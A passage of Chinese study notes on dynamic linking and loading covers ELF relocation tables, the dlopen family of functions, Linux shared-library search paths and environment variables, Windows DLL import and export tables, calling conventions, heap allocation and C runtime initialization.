<p>“.dynstr”动态符号字符串表</p>
<h3 id="动态链接重定位表"><a href="#动态链接重定位表" class="headerlink" title="动态链接重定位表"></a>动态链接重定位表</h3><p>“.rel.dyn”和”.rel.plt”</p>
<p>“.rel.dyn”对数据引用的修正，它所修正的位置位于”.got”以及数据段</p>
<p>“.rel.plt”是对函数引用的修正，它所修正的位置位于”.got.plt”。</p>
<h3 id="动态链接时进程堆栈初始化信息"><a href="#动态链接时进程堆栈初始化信息" class="headerlink" title="动态链接时进程堆栈初始化信息"></a>动态链接时进程堆栈初始化信息</h3><p>进程初始化时，堆栈里保存了关于进程执行环境和命令行参数等信息。事实上，堆栈里还保存了动态链接器所需要的一些辅助信息数组。</p>
<h2 id="动态链接的步骤和实现"><a href="#动态链接的步骤和实现" class="headerlink" title="动态链接的步骤和实现"></a>动态链接的步骤和实现</h2><p>动态链接的步骤基本上分为3步：先是启动动态链接器本身，然后装载所需要的共享对象，最后是重定位和初始化。</p>
<h3 id="动态链接器自举"><a href="#动态链接器自举" class="headerlink" title="动态链接器自举"></a>动态链接器自举</h3><p>自举：具有一定限制条件的启动代码。</p>
<p>动态链接器入口地址即是自举代码的入口，当操作系统将进程控制权交给动态链接器时，动态链接器的自举代码即开始执行。自举代码首先会找到它自举的GOT，而GOT的第一个入口保存的即是”.dynamic”段的偏移地址，由此找到了动态链接器本身的”.dynamic”段。通过”.dynamic”中的信息，自举代码便可以获得动态链接器本身的重定位表和符号表等，从而得到动态链接器本身的重定位入口，先将它们全部重定位。</p>
<h3 id="装载共享对象"><a href="#装载共享对象" class="headerlink" title="装载共享对象"></a>装载共享对象</h3><p>完成基本自举后，动态链接器将可执行文件和链接器本身的符号表都合并到一个符号表中，我们可以称它为全局符号表。然后链接器开始寻找可执行问所依赖的共享对象（.dynamic中类型的入口是DT_NEEDED支出了该可执行文件所依赖的共享对象），并将这些共享对象的名字放入到一个装载集合中。然后链接器开始从集合里取出一个所需要的的共享对象的名字，找到相应的文件后打开该文件，读取相应的ELF文件头和”.dynamic”段，然后将它相应的代码段和数据段映射到进程空间中。如果这个ELF共享对象还依赖于其他共享对象，那么将所依赖的共享对象的名字放到装载集合中。如此循环知道所有依赖的共享对象都被装载进来为止。当一个新的共享对象被装载进来的时候，它的符号表会被合并到全局符号表中，所以当所有的共享对象都被装载进来的时候，全局符号表里面将包含进程中所有的动态链接所需要的符号。</p>
<p>这个过程中，链接器可以有不同的装载顺序，如使用深度优先或者广度优先算法等，比较常见的算法一般都是广度优先的。</p>
<h4 id="符号优先级"><a href="#符号优先级" class="headerlink" title="符号优先级"></a>符号优先级</h4><h5 id="全局符号介入"><a href="#全局符号介入" class="headerlink" title="全局符号介入"></a>全局符号介入</h5><p>当一个符号需要被加入全局符号表时，如果相同的符号名已经存在，则后加入的符号被忽略。</p>
<h3 id="重定位和初始化"><a href="#重定位和初始化" class="headerlink" title="重定位和初始化"></a>重定位和初始化</h3><p>当上面的步骤完成之后，链接器开始重新遍历可执行文件和每个共享对象的重定位表，将它们的GOT/PLT中的每个需要重定位的位置进行修正。</p>
<p>重定位完成之后，乳沟某个共享对象有”.init”段，那么动态链接器会执行”.init”段中的代码，用以实现共享对象特有的初始化过程。相应的，共享对象中还可能有”.finit”段，当进程退出时会指向”.finit”段中的代码，可以用来实现类似C++全局对象析构之类的操作。</p>
<h3 id="Linux动态链接器实现"><a href="#Linux动态链接器实现" class="headerlink" title="Linux动态链接器实现"></a>Linux动态链接器实现</h3><p>动态链接器本身是静态链接。</p>
<p>动态链接器可以是PIC也可以不是，但往往使用PIC会更加简单。</p>
<h2 id="显式运行时链接"><a href="#显式运行时链接" class="headerlink" title="显式运行时链接"></a>显式运行时链接</h2><p>显式运行时链接有时也叫运行时加载，即让程序自己再运行时控制加载指定的模块，并且可以在不需要该模块时将其卸载。</p>
<h3 id="动态装载库"><a href="#动态装载库" class="headerlink" title="动态装载库"></a>动态装载库</h3><p>共享对象不需要进行任何修改就可以进行运行时装载。</p>
<p>动态库的装载是通过一系列由动态链接器提供的API完成的，具体的讲共有4个函数：打开动态库(dlopen)、查找符号(dlsym)、错误处理(dlerror)、以及关闭动态库(dlclose)。</p>
<h3 id="dlopen"><a href="#dlopen" class="headerlink" title="dlopen()"></a>dlopen()</h3><p>dlopen()函数用来打开一个动态库，并将其加载到进程的地址空间，完成初始化过程，它的C原型定义为：</p>
<p>void * dlopen(const char *filename, int flag);</p>
<p>返回值为被加载模块的句柄；若加载模块失败，则返回NULL。若已经被加载过了，那么返回的是同一个句柄。</p>
<p>若模块间存在依赖关系，如A依赖于B，则应手工加载B，然后再加载A。</p>
<p>同时，加载模块时会执行模块中的”.init”段代码。</p>
<h4 id="filename"><a href="#filename" class="headerlink" title="filename"></a>filename</h4><p>第一个参数是被加载动态库的路径，如果是绝对路径（“/”开始的路径），则该函数将会尝试直接打开该动态库；如果是相对路径，那么会尝试在以一定的顺序去查找该动态库文件：</p>
<ol>
<li>查找由环境变量LD_LIBRARY_PATH指定的一系列目录。</li>
<li>查找由/etc/ld.so.cache里面所有指定的共享库路径。</li>
<li>/lib、/usr/lib  注意：这个查找顺序与旧的a.out装载器的顺序刚好相反，旧的a.out的装载器在装载共享库的时候会先查找/usr/lib，然后是/libc。</li>
</ol>
<p>若filename这个参数为0，则dlopen()返回的将是全局符号表的句柄。即可以在运行时找到全局符号表里面的任何一个符号，并且可以执行他们。全局符号表包括了程序的可执行文件本身、被动态链接器加载到进程中的所有共享模块以及在运行时通过dlopen打开并且使用了RTLD_GLOBAL方式的模块中的符号</p>
<h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>第二个参数flag表示函数符号的解析方式：</p>
<ol>
<li>RTLD_LAZY表示使用延迟绑定。</li>
<li>RTLD_NOW表示当模块被加载时即完成所有函数绑定的工作，如果有任何未定义的符号引用的绑定工作没法完成，那么dlopen()就返回错误（可用dlerror()立即捕获到相应的错误信息）。</li>
<li>RTLD_GLOBAL表示将被加载的模块的全局符号合并到进程的全局符号表中，使得以后加载模块可以使用这些符号。</li>
</ol>
<p>上面1、2两种绑定方式必选其一，第3种方式可以跟上面两者中任意一个一起使用。</p>
<h3 id="dlsym"><a href="#dlsym" class="headerlink" title="dlsym()"></a>dlsym()</h3><p>dlsym函数基本上是运行时装载的核心部分，我们可以通过这个函数找到所需要的符号。它的定义如下：</p>
<p>void * dlsym(void *handle, char *symbol);</p>
<p>第一个参数是由dlopen()返回的动态库的句柄；第二个参数即所要查找的符号的名字。</p>
<p>若找到了相应的符号，则返回该符号的值；若未查找到则返回NULL。</p>
<p>同时，若查找到符号，则dlerror()返回NULL；若未找到，dlerror()则返回相应的错误信息。</p>
<p>注：若查找的符号是函数，那么返回的是函数地址；若查找的符号是变量，则返回变量的地址；若查找的符号是常量，则返回常量的值。</p>
<h4 id="符号优先级-1"><a href="#符号优先级-1" class="headerlink" title="符号优先级"></a>符号优先级</h4><p>dlsym()对符号的查找优先级分两种类型。</p>
<ol>
<li>如果是在全局符号表中进行符号查找，即dlopen()时，参数filename为NULL，那么由于全局符号表使用的是装载序列，所以dlsym()使用的也是装载序列。</li>
<li>如果是对某个通过dlopen()打开的共享对象进行符号查找的话，那么采用的是依赖序列的优先级，即以被dlopen()打开的那个共享对象为根节点，对它所有依赖的共享对象进行广度优先遍历，直到找到符号为止。</li>
</ol>
<h3 id="dlerror"><a href="#dlerror" class="headerlink" title="dlerror()"></a>dlerror()</h3><p>每次调用dlopen()、dlsym()、dlclose()以后，都可以调用dlerror()函数来判读上一次抵用是否成功。返回值类型为char*。如果返回NULL，则表示上一次调用成功；如果不是，则返回相应的错误消息。</p>
<h3 id="dlclose"><a href="#dlclose" class="headerlink" title="dlclose()"></a>dlclose()</h3><p>dlclose()的作用是将一个已经加装的模块卸载。</p>
<p>系统会维持一个加装引用计算器，每次使用dlopen()加装某模块时，相应的计数器加一；每次使用dlclose()卸载某模块时，相应计数器减一，只有当计数器减到0时，模块才被真正地卸载掉。</p>
<p>卸载的过程先执行”.finit”段的代码，然后将相应的符号从符号表中去除，取消进程空间跟模块的映射关系，然后关闭模块文件。</p>
<h1 id="Linux共享库的组织"><a href="#Linux共享库的组织" class="headerlink" title="Linux共享库的组织"></a>Linux共享库的组织</h1><h2 id="共享库版本"><a href="#共享库版本" class="headerlink" title="共享库版本"></a>共享库版本</h2><h3 id="共享库兼容性"><a href="#共享库兼容性" class="headerlink" title="共享库兼容性"></a>共享库兼容性</h3><p>共享库的更新可分为两类：</p>
<ol>
<li>兼容性更新</li>
<li>不兼容性更新</li>
</ol>
<p>ABI：二进制接口</p>
<h3 id="共享库版本命名"><a href="#共享库版本命名" class="headerlink" title="共享库版本命名"></a>共享库版本命名</h3><p>libname.so.x.y.z</p>
<p>x表示主版本号，y表示次版本号，z表示发布版本号</p>
<h2 id="符号版本"><a href="#符号版本" class="headerlink" title="符号版本"></a>符号版本</h2><h5 id="次版本号交会问题"><a href="#次版本号交会问题" class="headerlink" title="次版本号交会问题"></a>次版本号交会问题</h5><h3 id="基于符号的版本机制"><a href="#基于符号的版本机制" class="headerlink" title="基于符号的版本机制"></a>基于符号的版本机制</h3><h2 id="共享库系统路径"><a href="#共享库系统路径" class="headerlink" title="共享库系统路径"></a>共享库系统路径</h2><h3 id="FHS标准"><a href="#FHS标准" class="headerlink" title="FHS标准"></a>FHS标准</h3><p>该标准规定了一个系统中的系统文件应该如何存放，包括各个目录的结构、组织和作用。</p>
<p>/lib：这个位置主要存放系统最关键和基础的共享库，如动态链接库、C语言运行库、数学库等，主要是那些/bin和/sbin下的程序所需要用到的库，还有系统启动时需要的库</p>
<p>/usr/lib：这个目录下主要保存的是一些非系统运行时所需要的关键性的共享库，主要是一些开发时用到的库，同时还包含了开发时可能会用到的静态库、目标文件等。</p>
<p>/usr/local/lib：这个目录用来放置一些跟操作系统本身并不十分相关的库，主要是一些第三方的应用程序的库。</p>
<h2 id="共享库查找过程"><a href="#共享库查找过程" class="headerlink" title="共享库查找过程"></a>共享库查找过程</h2><h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><h3 id="LD-LIBRARY-PATH"><a href="#LD-LIBRARY-PATH" class="headerlink" title="LD_LIBRARY_PATH"></a>LD_LIBRARY_PATH</h3><p>用于指定动态库目录</p>
<h3 id="lib-ld-linux-so-2-library-path-home-user-bin-ls"><a href="#lib-ld-linux-so-2-library-path-home-user-bin-ls" class="headerlink" title="/lib/ld-linux.so.2 -library-path /home/user /bin/ls"></a>/lib/ld-linux.so.2 -library-path /home/user /bin/ls</h3><p>用动态链接器指定动态库目录启动ls</p>
<h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>指定预先装载的一些动态库或是目标文件</p>
<h3 id="etc-ld-so-preload"><a href="#etc-ld-so-preload" class="headerlink" title="/etc/ld.so.preload"></a>/etc/ld.so.preload</h3><p>其中配置作用跟LD_PRELOAD相同</p>
<h3 id="LD-DEBUG"><a href="#LD-DEBUG" class="headerlink" title="LD_DEBUG"></a>LD_DEBUG</h3><p>有几种值：</p>
<p>files：打印整个装载过程</p>
<p>bindings：显示动态链接的符号绑定过程</p>
<p>libs：显示共享库的查找过程</p>
<p>versions：显示符号版本依赖关系</p>
<p>reloc：显示重定位过程</p>
<p>symbols：显示符号查找过程</p>
<p>statistics：显示动态链接过程中的各种统计信息</p>
<p>all：显示以上所有信息</p>
<p>help：显示上面的各种可选值的帮助信息</p>
<p>用法：LD_DEBUG=files ./helloworld.out</p>
<h2 id="共享库的创建与安装"><a href="#共享库的创建与安装" class="headerlink" title="共享库的创建与安装"></a>共享库的创建与安装</h2><h1 id="Windows下的动态链接"><a href="#Windows下的动态链接" class="headerlink" title="Windows下的动态链接"></a>Windows下的动态链接</h1><h2 id="DLL简介"><a href="#DLL简介" class="headerlink" title="DLL简介"></a>DLL简介</h2><h3 id="进程地址空间和内存空间"><a href="#进程地址空间和内存空间" class="headerlink" title="进程地址空间和内存空间"></a>进程地址空间和内存空间</h3><h3 id="基地址和RVA"><a href="#基地址和RVA" class="headerlink" title="基地址和RVA"></a>基地址和RVA</h3><h3 id="DLL共享数据段"><a href="#DLL共享数据段" class="headerlink" title="DLL共享数据段"></a>DLL共享数据段</h3><p>Windows允许将DLL的数据段设置成共享的，即任何进程都可以共享该DLL的同一份数据段。</p>
<h3 id="DLL显示运行时链接"><a href="#DLL显示运行时链接" class="headerlink" title="DLL显示运行时链接"></a>DLL显示运行时链接</h3><p>Windows提供了3个API为：</p>
<p>LoadLibrary（或者LoadLibraryEx），这个函数用来装载一个DLL到进程的地址空间，它的功能跟dlopen类似。</p>
<p>GetProcAddress，用来查找某个符号的地址，与dlsym类似。</p>
<p>FreeLibrary，用来卸载某个已加载的模块，与dlclose类似。</p>
<h2 id="符号导出导入表"><a href="#符号导出导入表" class="headerlink" title="符号导出导入表"></a>符号导出导入表</h2><h3 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h3><p>当一个PE需要将一些函数或变量提供给其他PE文件使用时，我们把这种行为叫做符号导出。</p>
<p>所有导出的符号被集中存放在了北滘镇导出表的结构中。</p>
<p>DataDirectory的结构数组中第一个元素就是导出表的结构的地址和长度。</p>
<p>导出表结构中，最后的3个成员指向的是3个数组，这3个数组是导出表中最重要的结构，他们是导出地址表（存放的是各个导出函数的RVA）、符号名表（保存的是导出函数的名字）和名字序号对应表。</p>
<h4 id="序号"><a href="#序号" class="headerlink" title="序号"></a>序号</h4><p>一个导出函数的序号就是函数在EAT中的地址下标加上一个Base值（也就是IMAGE_EXPORT_DIRECTORY中的Base，默认情况下它的值是1）。</p>
<h3 id="EXP文件"><a href="#EXP文件" class="headerlink" title="EXP文件"></a>EXP文件</h3><p>链接器在创建DLL时与静态链接时一样采用两遍扫描过程，DLL一般都有导出符号，链接器在第一遍时会遍历所有目标文件并且收集所有导出符号信息并且创建DLL的导出表。链接器把这个导出表放到一个临时的目标文件叫做”.edata”的段中，这个目标文件就是EXP文件。EXP文件是一个标准的PE/COFF目标文件。</p>
<p>在第二遍时，链接器就把这个EXP文件当做普通的目标文件一样，与其他输入的目标文件链接在一起并且输出DLL。这个时候EXP文件中的”.edata”段也就会被输出到DLL文件中并且成为导出表。一般情况下把”.edata”段合并到只读数据段”,rdata”中。</p>
<h3 id="导出重定向"><a href="#导出重定向" class="headerlink" title="导出重定向"></a>导出重定向</h3><p>即将某个导出符号重定向到另外一个DLL。</p>
<h3 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h3><p>如果我们再某个程序中使用到了来自DLL的函数或者变量，那么我们就把这种行为叫做符号导入。</p>
<p>在PE文件中，导入表是一个IMAGE_IMPORT_DESCRIPTOR的结构体数组，每个一个结构对应一个被导入的DLL。</p>
<p>结构体重最后一项FirstThunk指向一个导入地址数组(IAT)，IAT是导入表中最重要的结构，IAT中每个元素对应一个被导入的符号，元素的值在不同的情况下有不同的含义：</p>
<ul>
<li>在动态链接器刚完成映射还没开始重定位和符号解析时，IAT中的元素值表示相对应的导入符号的序号或者是符号名。</li>
<li>当Windows的动态链接器在完成该模块的链接时，元素值会被动态链接器改写成该符号的真正地址。</li>
<li>对于32位的PE来说，如果改元素最高位被置1，那么低31位值就是导入符号的序号值；如果没有那么元素的值是指向一个叫做IMAGE_IMPORT_BY_NAME结构的RVA。</li>
</ul>
<p>结构体第一项还有一个指针OriginalFirstThrunk，它指向一个数组叫做导入名称表（INT），这个数组与IAT一模一样，里面的数值也一样。</p>
<h4 id="延迟载入"><a href="#延迟载入" class="headerlink" title="延迟载入"></a>延迟载入</h4><h3 id="导入函数的调用"><a href="#导入函数的调用" class="headerlink" title="导入函数的调用"></a>导入函数的调用</h3><h2 id="DLL优化"><a href="#DLL优化" class="headerlink" title="DLL优化"></a>DLL优化</h2><h3 id="重定基地址"><a href="#重定基地址" class="headerlink" title="重定基地址"></a>重定基地址</h3><p>Windows PE采用了装载时重定位的方法。在DLL模块装载时，如果目标地址被占用，那么操作系统就会为它分配一块新的空间，并且将DLL装载到该地址。</p>
<p>重定位过程中，涉及到绝对地址的引用都进行重定位，所有这些需要重定位的地方只需要加上一个固定的差值。</p>
<p>事实上由于DLL内部的地址都是基于基地址，或者是相对于基地址的RVA、那么所有需要重定位的地方都只需要加上一个固定的差值。PE里面把这种特殊的重定位过程又叫做重定基地址。</p>
<h3 id="序号-1"><a href="#序号-1" class="headerlink" title="序号"></a>序号</h3><p>一个DLL中每一个导出函数都有一个对应的序号。</p>
<h3 id="导入函数绑定"><a href="#导入函数绑定" class="headerlink" title="导入函数绑定"></a>导入函数绑定</h3><h4 id="DLL绑定的实现"><a href="#DLL绑定的实现" class="headerlink" title="DLL绑定的实现"></a>DLL绑定的实现</h4><p>editbin对绑定的程序的导入符号进行遍历查找，找到以后就把符号的运行时的目标地址写入到被绑定程序的导入表内（INT）。</p>
<h4 id="绑定地址失效"><a href="#绑定地址失效" class="headerlink" title="绑定地址失效"></a>绑定地址失效</h4><p>一种情况是被依赖的DLL更新导致DLL的导出函数地址发生变化；另外一种情况是被依赖的DLL在装载时发生重定基址，导致DLL的装载地址与被绑定时不一致。</p>
<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>对于第一种情况，当堆程序进行绑定时，对每个导入的DLL，链接器把DLL的时间戳和校验和保存到被绑定的PE文件的导入表中。在运行时，Windows会核对将要被装载的DLL与绑定时的DLL版本是否相同，并且确认该DLL没有发生重定基址，如果一切正常，那么Windows就不需要再进行符号解析过程了；否则Windows就忽略绑定的符号地址，按照正常的符号解析过程对DLL的符号进行解析。</p>
<h2 id="C-与动态链接"><a href="#C-与动态链接" class="headerlink" title="C++与动态链接"></a>C++与动态链接</h2><h4 id="组件对象模块"><a href="#组件对象模块" class="headerlink" title="组件对象模块"></a>组件对象模块</h4><p>《COM本质论》</p>
<h2 id="DLL-HELL"><a href="#DLL-HELL" class="headerlink" title="DLL HELL"></a>DLL HELL</h2><h4 id="解决DLL-HELL的方法"><a href="#解决DLL-HELL的方法" class="headerlink" title="解决DLL HELL的方法"></a>解决DLL HELL的方法</h4><ul>
<li><p>静态链接</p>
</li>
<li><p>防止DLL覆盖</p>
</li>
<li><p>避免DLL冲突</p>
</li>
<li><p>.NET下DLL HELL的解决方案</p>
</li>
</ul>
<h1 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h1><h2 id="程序的内存布局"><a href="#程序的内存布局" class="headerlink" title="程序的内存布局"></a>程序的内存布局</h2><h2 id="栈与调用惯例"><a href="#栈与调用惯例" class="headerlink" title="栈与调用惯例"></a>栈与调用惯例</h2><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><p>栈保存了一个函数调用所需要的维护信息，这常常被称为堆栈帧或活动记录，一般包括如下几方面内容：</p>
<ul>
<li>函数的返回地址和参数</li>
<li>临时变量：包括函数的非晶体局部变量以及编译器自动生成的其他临时变量。</li>
<li>保存的上下文：包括在函数调用前后需要保持不变的寄存器。</li>
</ul>
<p>一个i386下的函数总是这样调用的：</p>
<ol>
<li>把所有或一部分参数压入栈中，如果有其他参数没用入栈，那么使用某些特定的寄存器传递。</li>
<li>把当前指令的下一条指令的地址压入栈中。</li>
<li>跳转到函数体执行。</li>
</ol>
<p>而i386函数体的“标准”开头是这样的：</p>
<ul>
<li>push ebp;</li>
<li>mov ebp,esp;</li>
<li>[可选]sub ebp,xxx;</li>
<li>[可选]push xxx;</li>
</ul>
<p>“标准”结尾：</p>
<ul>
<li>[可选]pop xxx;</li>
<li>mov esp,ebp;</li>
<li>pop ebp;</li>
<li>ret;</li>
</ul>
<h3 id="调用惯例"><a href="#调用惯例" class="headerlink" title="调用惯例"></a>调用惯例</h3><p>一个调用惯例一般会规定如下几个方面的内容：</p>
<ul>
<li>函数参数的传递顺序和方式</li>
<li>栈的维护方式</li>
<li>名字修饰的策略</li>
</ul>
<table>
<thead>
<tr>
<th align="center">调用惯例</th>
<th align="center">出栈方</th>
<th align="center">参数传递</th>
<th align="center">名字修饰</th>
</tr>
</thead>
<tbody><tr>
<td align="center">cdecl</td>
<td align="center">函数调用方</td>
<td align="center">从右至左的顺序压参数入栈【如fun(a,b),先压b再压a】</td>
<td align="center">下划线+函数名</td>
</tr>
<tr>
<td align="center">stdcall</td>
<td align="center">函数本身</td>
<td align="center">从右至左的顺序压参数入栈</td>
<td align="center">下划线+函数名+@+参数的字节数，如函数int func(int a,double b)的修饰名是_func@12</td>
</tr>
<tr>
<td align="center">fastcall</td>
<td align="center">函数本身</td>
<td align="center">头两个DWORD(4字节)类型或者占更少字节的参数被放入寄存器，其他剩下的参数按从右到左的顺序压入栈</td>
<td align="center">@+函数名+@+参数的字节数</td>
</tr>
<tr>
<td align="center">pascal</td>
<td align="center">函数本身</td>
<td align="center">从左至右的顺序压参数入栈</td>
<td align="center">较为复杂，参见pascal文档</td>
</tr>
</tbody></table>
<h3 id="函数返回值的传递"><a href="#函数返回值的传递" class="headerlink" title="函数返回值的传递"></a>函数返回值的传递</h3><p>4字节以内：存放在eax</p>
<p>5—8字节：低4字节存放在eax，高1—4字节存放在edx</p>
<p>大于8字节：在栈上额外开辟空间，将返回值传入，并将该地址指针传给eax，返回后，调用方将eax指向的地址的值拷贝出来。</p>
<h3 id="堆和内存管理"><a href="#堆和内存管理" class="headerlink" title="堆和内存管理"></a>堆和内存管理</h3><h3 id="Linux进程堆管理"><a href="#Linux进程堆管理" class="headerlink" title="Linux进程堆管理"></a>Linux进程堆管理</h3><h3 id="Windows进程堆管理"><a href="#Windows进程堆管理" class="headerlink" title="Windows进程堆管理"></a>Windows进程堆管理</h3><h4 id="堆管理器"><a href="#堆管理器" class="headerlink" title="堆管理器"></a>堆管理器</h4><h3 id="堆分配算法"><a href="#堆分配算法" class="headerlink" title="堆分配算法"></a>堆分配算法</h3><h4 id="空闲链表"><a href="#空闲链表" class="headerlink" title="空闲链表"></a>空闲链表</h4><p>将堆中各个空闲的块按照链表的方式连接起来，当用户请求一块空间时，可以遍历整个列表，直到找到合适大小的块并且将它拆分；当用户释放空间时将它合并到空闲链表中。</p>
<h4 id="位图"><a href="#位图" class="headerlink" title="位图"></a>位图</h4><p>其核心思想是将整个堆划分为大量的块，每个块的大小相同。当用户请求内存的时候，总是分配整数个块的空间给用户，第一个块我们称为已分配区域的头，其余的称为已分配区域的主体。而我们可以使用一个整数数组来记录块的使用情况，由于每个块只有头/主体/空闲三种状态，因此仅仅需要两位即可表示一个块，因此称为位图。</p>
<h4 id="对象池"><a href="#对象池" class="headerlink" title="对象池"></a>对象池</h4><p>当被分配对象的大小是较为固定的几个值，这时候我们可以针对这样的特征设计一个更为高效的堆算法，称为对象池。</p>
<p>对象池的思路：如果每一次分配的空间大小都一样，那么就可以按照这个每次请求分配的大小作为一个单位，，把整个堆空间划分为大量的小块，每次请求的时候只需要找到一个小块就可以了。</p>
<p>对象池的管理方法可以采用空闲链表，也可以采用位图，与它们的区别仅仅在于它假设了每次请求的都是一个固定的大小。</p>
<h1 id="运行库"><a href="#运行库" class="headerlink" title="运行库"></a>运行库</h1><h2 id="入口函数和程序的初始化"><a href="#入口函数和程序的初始化" class="headerlink" title="入口函数和程序的初始化"></a>入口函数和程序的初始化</h2><p>一个典型的程序运行步骤大致如下：</p>
<ul>
<li>操作系统在创建进程后，把控制权交到了程序的入口，这个入口往往是运行库中的某个入口函数。</li>
<li>入口函数对运行库和程序运行环境进行初始化，包括堆、I/O、线程、全局变量构造，等等。</li>
<li>入口函数在完成初始化之后，调用main函数，正式开始执行程序主体部分。</li>
<li>main函数执行完毕以后，返回到入口函数，入口函数进行清理工作，包括全局变量析构、堆销毁，关闭I/O等，然后进行系统调用结束进程。</li>
</ul>
<h3 id="入口函数的实现"><a href="#入口函数的实现" class="headerlink" title="入口函数的实现"></a>入口函数的实现</h3><h4 id="GLIBC入口函数"><a href="#GLIBC入口函数" class="headerlink" title="GLIBC入口函数"></a>GLIBC入口函数</h4><h5 id="静态glibc"><a href="#静态glibc" class="headerlink" title="静态glibc"></a>静态glibc</h5><h4 id="MSVC-CRT-入口函数"><a href="#MSVC-CRT-入口函数" class="headerlink" title="MSVC CRT 入口函数"></a>MSVC CRT 入口函数</h4><p>入口函数mainCRTStartup的总体流程：</p>
<ol>
<li>初始化和OS版本有关的全局变量</li>
<li>初始化堆</li>
<li>初始化I/O</li>
<li>获取命令行参数和环境变量</li>
<li>初始化C库的一些数据</li>
<li>调用main并记录返回值</li>
<li>检查错误并将main的返回值返回</li>
</ol>
<h3 id="运行库与I-O"><a href="#运行库与I-O" class="headerlink" title="运行库与I/O"></a>运行库与I/O</h3><p>在Linux中，值为0、1、2的fd分布代码标准输入、标准输出和标准错误输出。</p>
<h4 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h4><p>在内核中，每一个进程都有一个私有的“打开文件表”，这个表是一个指针数组，每一个元素都指向一个内核的打开文件对象，而fd就是这个表的下标。</p>
<p>stdin、stdout、stderr均是FILE结构的指针。</p>
<h4 id="句柄"><a href="#句柄" class="headerlink" title="句柄"></a>句柄</h4><p>对于Windows中的句柄，与Linux中的fd大同小异，不过Windows的句柄是其下标经过某种线性变换之后的结果。</p>
<h4 id="I-O初始化"><a href="#I-O初始化" class="headerlink" title="I/O初始化"></a>I/O初始化</h4><p>首先I/O初始化函数需要在用户空间中建立stdin、stdout、stderr及其对应的FILE结构，使得程序进入main之后可以直接使用printf、scanf等函数。</p>
<h3 id="MSVC-CRT的入口函数初始化"><a href="#MSVC-CRT的入口函数初始化" class="headerlink" title="MSVC CRT的入口函数初始化"></a>MSVC CRT的入口函数初始化</h3><p>MSVC的入口函数初始化主要包含两部分，堆初始化和I/O初始化。</p>
<h4 id="系统堆初始化"><a href="#系统堆初始化" class="headerlink" title="系统堆初始化"></a>系统堆初始化</h4><p>主要由函数_heap_int完成。</p>
<h4 id="I-O初始化-1"><a href="#I-O初始化-1" class="headerlink" title="I/O初始化"></a>I/O初始化</h4><p>MSVC的I/O初始化就是要构造一个二维的打开文件表。由_ioinit函数完成。主要完成如下几个工作：</p>
<ol>
<li>建立打开文件表。</li>
<li>如果能够继承自父进程，那么从父进程获取继承的句柄。</li>
<li>初始化标准输入输出。</li>
</ol>
<h2 id="C-C-运行库"><a href="#C-C-运行库" class="headerlink" title="C/C++运行库"></a>C/C++运行库</h2><h3 id="C语言运行库"><a href="#C语言运行库" class="headerlink" title="C语言运行库"></a>C语言运行库</h3><p>一个C语言运行库大致包含如下功能：</p>
<ul>
<li>启动与退出：包括入口函数及入口函数所依赖的其他函数等。</li>
<li>标准函数：由C语言标准规定的C语言标准库所拥有的函数实现。</li>
<li>I/O：I/O功能的封装和实现。</li>
<li>堆：堆的封装和实现。</li>
<li>语言实现：语言中一些特殊功能的实现。</li>
<li>调试：实现调试功能的代码。</li>
</ul>
<h3 id="C语言标准库"><a href="#C语言标准库" class="headerlink" title="C语言标准库"></a>C语言标准库</h3><p>C语言标准库一般包含：</p>
<ul>
<li>标准输入输出（stdio.h）</li>
<li>文件操作（stdio.h）</li>
<li>字符操作（ctype.h）</li>
<li>字符串操作（string.h）</li>
<li>数学函数（math.h）</li>
<li>资源管理（stdlib.h）</li>
<li>格式转化（stdlib.h）</li>
<li>时间/日期（time.h）</li>
<li>断言（assert.h）</li>
<li>各种类型上的常数（limits.h&amp;float.h)</li>
<li>变长参数（stdarg.h）</li>
<li>非局部跳转（setjmp.h）</li>
</ul>
<h4 id="变长参数"><a href="#变长参数" class="headerlink" title="变长参数"></a>变长参数</h4><p>如print即使用变长参数。</p>
<h4 id="非局部跳转"><a href="#非局部跳转" class="headerlink" title="非局部跳转"></a>非局部跳转</h4><p>使用非局部跳转，可以实现从一个函数体内向另一个事先登记过的函数体内跳转，而不用担心堆栈混乱。</p>
<p>setjmp与longjmp函数</p>
<h3 id="glibc与MSVC-CRT"><a href="#glibc与MSVC-CRT" class="headerlink" title="glibc与MSVC CRT"></a>glibc与MSVC CRT</h3><h2 id="运行库与多线程"><a href="#运行库与多线程" class="headerlink" title="运行库与多线程"></a>运行库与多线程</h2><h3 id="CRT的多线程困扰"><a href="#CRT的多线程困扰" class="headerlink" title="CRT的多线程困扰"></a>CRT的多线程困扰</h3><h4 id="线程的访问权限"><a href="#线程的访问权限" class="headerlink" title="线程的访问权限"></a>线程的访问权限</h4><p>实际运用中线程拥有自己的私有存储空间：</p>
<ul>
<li>栈（尽管并非完全无法被其他线程访问）</li>
<li>线程局部存储（TLS）。线程局部存储是某些操作系统为线程单独提供的私有空间，但通常只具有很有限的尺寸。</li>
<li>寄存器（包括PC寄存器），寄存器是执行流的基本数据，因此为线程私有。</li>
</ul>
<h2 id="fread实现"><a href="#fread实现" class="headerlink" title="fread实现"></a>fread实现</h2><h3 id="缓冲"><a href="#缓冲" class="headerlink" title="缓冲"></a>缓冲</h3><h1 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h1><h2 id="系统调用介绍"><a href="#系统调用介绍" class="headerlink" title="系统调用介绍"></a>系统调用介绍</h2><h3 id="Linux系统调用"><a href="#Linux系统调用" class="headerlink" title="Linux系统调用"></a>Linux系统调用</h3><p>在x86下同下，系统调用由0x80中断完成，eax寄存器用于表示系统调用的接口号（比如1表示退出进程，2表示创建进程，3表示读取文件或IO，4表示写文件或IO）</p>
<h2 id="系统调用原理"><a href="#系统调用原理" class="headerlink" title="系统调用原理"></a>系统调用原理</h2><h3 id="特权级与中断"><a href="#特权级与中断" class="headerlink" title="特权级与中断"></a>特权级与中断</h3><p>在现代操作系统中，通常具有两种特权级别，分别为用户模式和内核模式，也被称为用户态和内核态。</p>
